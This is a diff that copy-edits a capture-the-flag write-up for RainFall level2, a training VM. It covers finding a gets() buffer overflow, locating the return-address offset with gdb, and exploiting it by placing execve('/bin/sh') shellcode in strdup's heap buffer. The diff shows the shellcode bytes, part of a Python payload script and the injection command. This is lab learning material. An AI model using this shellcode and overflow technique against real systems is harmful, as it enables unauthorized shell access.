@@ -4,7 +4,7 @@
 
 ## Attack type: ret2libc
 
-We started to play with binary, it seems to read on stdin and print on stdout the string we passed.
+We started to play with the binary, and it seems to read from stdin and print to stdout the string we passed.
 
 ```bash
 level2@RainFall:~$ ./level2
@@ -12,7 +12,7 @@ test
 test
 ```
 
-After few random test we notice that program segfault when the string passed exceed a certain value
+After a few random tests, we noticed that the program segfaults when the string passed exceeds a certain length.
 
 ```bash
 level2@RainFall:~$ ./level2
@@ -21,7 +21,7 @@ testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
 Segmentation fault (core dumped)
 ```
 
-We decompile binary with ghidra. We understand that we can do buffer overflow with variable named `local_50` and we also notice that there is weird condition based on value from `unaff_retaddr` but there is no line that setting value for this variable, interesting?
+We decompiled the binary with Ghidra. We understand that we can perform a buffer overflow with the variable named `local_50`. We also noticed that there is a strange condition based on the value from `unaff_retaddr`, but there is no line that sets the value for this variable. Interesting?
 
 ```c
 void p(void)
@@ -33,7 +33,6 @@ void p(void)
   gets(local_50);
   if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
     printf("(%p)\n",unaff_retaddr);
-                    /* WARNING: Subroutine does not return */
     _exit(1);
   }
   puts(local_50);
@@ -48,11 +47,14 @@ void main(void)
 }
 ```
 
-We open binary with gdb to understand the segfault. We watched many documentation/video and in some of them, they used pattern to found the return address (here a very good explanation: `https://www.youtube.com/watch?v=HSlhY4Uy8SA`).
+We found that `if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {` is a condition that prevents us from doing a stack buffer overflow.
+So we need to find a way to bypass this condition. (use the heap :))
 
-We used https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to generate pattern
+We opened the binary with gdb to understand the segfault. We watched many documentation/videos, and in some of them, they used patterns to find the return address (here is a very good explanation: `https://www.youtube.com/watch?v=HSlhY4Uy8SA`).
 
-```
+We used https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to generate the pattern.
+
+```bash
 level2@RainFall:~$ gdb level2
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
 Copyright (C) 2012 Free Software Foundation, Inc.
@@ -74,11 +76,11 @@ Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 ```
 
-`0x37634136` correspond to offset 80, so it's mean from this offset we overflowed the eip value.
+`0x37634136` corresponds to offset 80, so it means from this offset we overflowed the EIP value.
 
 Also, interesting thing we found is a feature named ASLR (Address space layout randomization). ASLR is a computer security technique involved in protection from buffer overflow attacks. ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap, and libraries.
 
-We checked if this activate/desactive with stored in `/proc/sys/kernel/randomize_va_space`. 0 for disable, 2 for enable
+We checked if this is activated/deactivated with the value stored in `/proc/sys/kernel/randomize_va_space`. 0 for disabled, 2 for enabled
 ```bash
 level3@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
 0
@@ -95,6 +97,9 @@ puts("test"test
 strdup("test")                                                                = 0x0804a008
 +++ exited (status 8) +++
 ```
+
+## Exploitation
+
 We attempted a buffer overflow using ret2libc, but it failed because the string "/bin/sh" was not present in the binary. Therefore, we opted for a shellcode exploit. We found a suitable shellcode that contains the string "/bin/sh" and an execve syscall to spawn a shell. We used the space created by strdup to store our shellcode and the overflow to override the return pointer from the function `p`.
 
 Many examples are available here: [Shell-Storm Shellcode Database](https://shell-storm.org/shellcode/files/shellcode-811.html) ([Shell-Storm Shellcode Index](https://shell-storm.org/shellcode/index.html)). We simply filtered by architecture.
@@ -102,28 +107,8 @@ Many examples are available here: [Shell-Storm Shellcode Database](https://shell
 level3@RainFall:~$ uname -a
 Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 athlon i386 GNU/Linux
 ```
-We pick this one
+We picked this one:
 ```c
-/*
-Title:	Linux x86 execve("/bin/sh") - 28 bytes
-Author:	Jean Pascal Pereira <pereira@secbiz.de>
-Web:	http://0xffe4.org
-Disassembly of section .text:
-08048060 <_start>:
- 8048060: 31 c0                 xor    %eax,%eax
- 8048062: 50                    push   %eax
- 8048063: 68 2f 2f 73 68        push   $0x68732f2f
- 8048068: 68 2f 62 69 6e        push   $0x6e69622f
- 804806d: 89 e3                 mov    %esp,%ebx
- 804806f: 89 c1                 mov    %eax,%ecx
- 8048071: 89 c2                 mov    %eax,%edx
- 8048073: b0 0b                 mov    $0xb,%al
- 8048075: cd 80                 int    $0x80
- 8048077: 31 c0                 xor    %eax,%eax
- 8048079: 40                    inc    %eax
- 804807a: cd 80                 int    $0x80
-*/
-
 #include <stdio.h>
 char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                    "\x68\x68\x2f\x62\x69\x6e\x89"
@@ -136,7 +121,8 @@ int main()
 }
 ```
 
-We made python script to inject it:
+We made a python script to inject it:
+
 ```python
 import struct
 
@@ -145,7 +131,7 @@ payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\
 print payload
 ```
 
-Then inject the shellcode.
+Then inject the shellcode:
 
 ```bash
 level2@RainFall:~$ (python /tmp/test.py; cat) | ./level2
